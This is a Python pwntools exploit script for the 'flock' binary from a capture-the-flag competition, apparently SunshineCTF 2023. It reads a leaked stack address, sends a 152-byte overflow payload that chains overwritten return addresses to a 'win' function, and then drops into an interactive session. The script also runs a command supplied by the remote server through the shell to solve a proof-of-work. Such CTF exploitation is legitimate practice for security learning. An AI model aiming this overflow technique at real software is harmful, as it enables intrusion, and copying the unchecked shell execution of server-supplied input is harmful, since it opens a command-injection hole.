#!/usr/bin/env python3
from pwn import *
import subprocess

elf = ELF("./flock_patched")

context.binary = elf
NULL = 0x0

'''
    #######################################
    #  REST AT THE END NOT IN THE MIDDLE  #
    #######################################
'''


def conn():
    global p, ssh_conn
    ssh_conn = ('HOST', 22, 'USER', 'PASS', 'BIN_NAME')
    if args.FLAG:
        running = log.progress("Createing the flag...")
        try:
            os.system("echo 'PWN{a_placeholder_32byte_flag}' > flag.txt")
            running.success()
        except:
            running.failure()
    if args.REMOTE:
        p = remote("chal.2023.sunshinectf.games", 23002)
    elif args.SSH:
        sshc = ssh(ssh_conn[2], ssh_conn[0], ssh_conn[1], ssh_conn[3])
        p = sshc.process([ssh_conn[4]])
    else:
        p = process([elf.path])
        if args.GDB:
            gdb.attach(p,'''
                ''')
        if args.PATCH:
            elf.asm(elf.symbols['alarm'], 'ret')
            elf.save([elf.path])
    return p

def get_one_gadget(filename: str, base_address=NULL) -> int:
    return [i + base_address for i in [int(i) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]]

def solve_poc(p):
    p.recvuntil(b"work: ")
    cmd = p.recvline()
    proc = log.progress(f"solving POC")

    try:
        solve = subprocess.check_output(cmd, shell=True, text=True).strip()
        proc.success("Done")
    except:
        proc.failure("Error")
        exit(-1)

    log.info(f"solve @ {solve}")
    p.sendline(solve.encode('utf-8'))

def get_leak():
    p.recvuntil(b"Begins At ")
    leak = int(p.recvline().strip(), 16)
    log.info(f"Stack_leak @ {hex(leak)}")

    return leak

def overflow():
    func4 = elf.symbols['func4'] + 13
    func3 = elf.symbols['func3'] + 13
    func2 = elf.symbols['func2'] + 13
    func1 = elf.symbols['func1'] + 9
    win = elf.symbols['win']

    stack_leak = get_leak()

    '''payload = flat(
        b"A" * 8,
        stack_leak + 0x10,
        p64(func3 + 13),
        p64(func2 + 13),
        b"B" * 96,
        stack_leak + 8,
        p64(func4 + 13),
        elf.symbols['win'],
    )'''

    payload = flat(
        b"A" * 0x20,
        stack_leak + 0x40,
        p64(func3),
        b"B" * 0x10,
        stack_leak + 0x48,
        p64(func2),
        p64(func1),
        win,
        win,
        b"C" * 0x10,
        win,
        stack_leak + 0x20,
        p64(func4),
        win,
    )

    assert(len(payload) == 152)

    p.sendlineafter(b">>> ", payload)

def main():
    with conn() as p:
        overflow()
        p.interactive()


if __name__ == "__main__":
    main()
